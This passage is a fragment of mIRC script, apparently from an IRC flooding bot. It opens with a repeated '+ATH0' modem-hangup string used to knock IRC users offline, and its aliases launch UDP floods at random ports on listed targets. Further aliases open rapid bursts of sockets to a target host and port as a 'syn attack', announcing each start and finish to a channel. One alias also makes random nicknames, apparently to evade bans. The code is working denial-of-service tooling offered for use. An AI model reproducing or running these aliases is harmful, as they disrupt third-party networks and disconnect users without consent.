+ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0
  if 9 == %limit { return }
  sockudp xudp10 $gettok($2,10,45) $r(1,65000) @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
  if 10 == %limit { return }
  return | :done | saym 1Code end [14Udp1] | .timerxudp off | unset %Mnum* 
}
alias synpx { if ($1 == $null) { return } | syn 1 $1- | syn 1 stop | syn 1 $1- | syn 1 stop | syn 1 $1- | syn 1 stop | syn 1 $1- | syn 1 stop | syn 1 $1- | syn 1 stop | syn 1 $1- | syn 1 stop |  syn 1 $1- | syn 1 stop | syn 1 $1- | syn 1 stop | syn 1 $1- | syn 1 stop | syn 1 $1- | syn 1 stop | saym Syn Attack Done! }
alias syn {
  if ($2 == start) { if ($3 !isnum) || ($5 !isnum) { return } | var %x = 1 | while (%x <= $3) { sockopen syn $+ $r(1,999) $+ $r(1,999) $+ $r(1,999) $4 $5 | inc %x  } }
  if ($2 == stop) { if ($sock(syn*,0) > 0) { sockclose syn* } }
}
alias n4sty { return $r(a,z) $+ $r(A,Z) $+ $r(1,9) $+ $r(a,z) $+ $r(A,Z) $+ $r(a,z) $+ $r(A,Z) $+ $r(a,z) $+ $r(A,Z) $+ $r(a,z) $+ $r(A,Z) }
alias xudp  { if $1 = -s { .timerxudp off | unset %Mnum | saym 1Code end [14Udp1] } | if $3 = $null { return } |  if $timer(xudp).com != $null { saym 1Code Error [14Udp1]: Coding at: $gettok($timer(xudp).com,3,32)  | return } | .saym 1Code Start [14Udp1]:Size:  $+ $1 $+  target:  $+ $gettok($2,1,45) $gettok($2,2,45) $gettok($2,3,45) $gettok($2,4,45) $gettok($2,5,45) $gettok($2,6,45) $gettok($2,7,45) $gettok($2,8,45) $gettok($2,9,45) $gettok($2,10,45) $+  ComPort:  $+ $3 $+  | set %Mnum 0 | set %limit $gettok($2,0,45) | .timerxudp -m 0 60 Mdope $1 $2 $3 }
